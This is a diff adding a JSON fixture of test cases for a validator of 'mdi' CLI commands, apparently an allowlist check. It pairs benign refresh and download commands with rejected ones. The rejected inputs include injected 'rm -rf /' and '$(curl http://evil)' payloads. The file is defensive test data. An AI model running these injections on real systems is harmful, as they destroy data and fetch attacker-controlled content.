@@ -1,0 +1,69 @@
+[
+  {
+    "cmd": "mdi refresh -t 019eac96-ce14-7439-5112-ed9506fe4126 -e  019e8ddb-684f-7bd0-460d-d06210a06b62  -s ./",
+    "valid": true,
+    "verb": "refresh",
+    "ticket_ids": [
+      "019eac96-ce14-7439-5112-ed9506fe4126"
+    ],
+    "event_ids": [
+      "019e8ddb-684f-7bd0-460d-d06210a06b62"
+    ]
+  },
+  {
+    "cmd": "mdi download event -u 0190abcd-1111-2222-3333-444455556666 -s ./",
+    "valid": true,
+    "verb": "event",
+    "clip_ukeys": [
+      "0190abcd-1111-2222-3333-444455556666"
+    ]
+  },
+  {
+    "cmd": "mdi refresh -t T1 -s ./",
+    "valid": true
+  },
+  {
+    "cmd": "mdi refresh -e E1 -s ./",
+    "valid": true
+  },
+  {
+    "cmd": "mdi refresh -u U1 -s ./",
+    "valid": true
+  },
+  {
+    "cmd": "mdi clip -u U1 -s ./",
+    "valid": true
+  },
+  {
+    "cmd": "mdi upload event -u U1 -s ./",
+    "valid": false
+  },
+  {
+    "cmd": "mdi login -u me -p secret",
+    "valid": false
+  },
+  {
+    "cmd": "mdi refresh -f /home/mini/map.txt",
+    "valid": false
+  },
+  {
+    "cmd": "mdi download event -u x; rm -rf /",
+    "valid": false
+  },
+  {
+    "cmd": "mdi refresh -t $(curl http://evil) -s ./",
+    "valid": false
+  },
+  {
+    "cmd": "mdi refresh -t T1 | cat",
+    "valid": false
+  },
+  {
+    "cmd": "mdi refresh -s ./",
+    "valid": false
+  },
+  {
+    "cmd": "rm -rf / # mdi",
+    "valid": false
+  }
+]
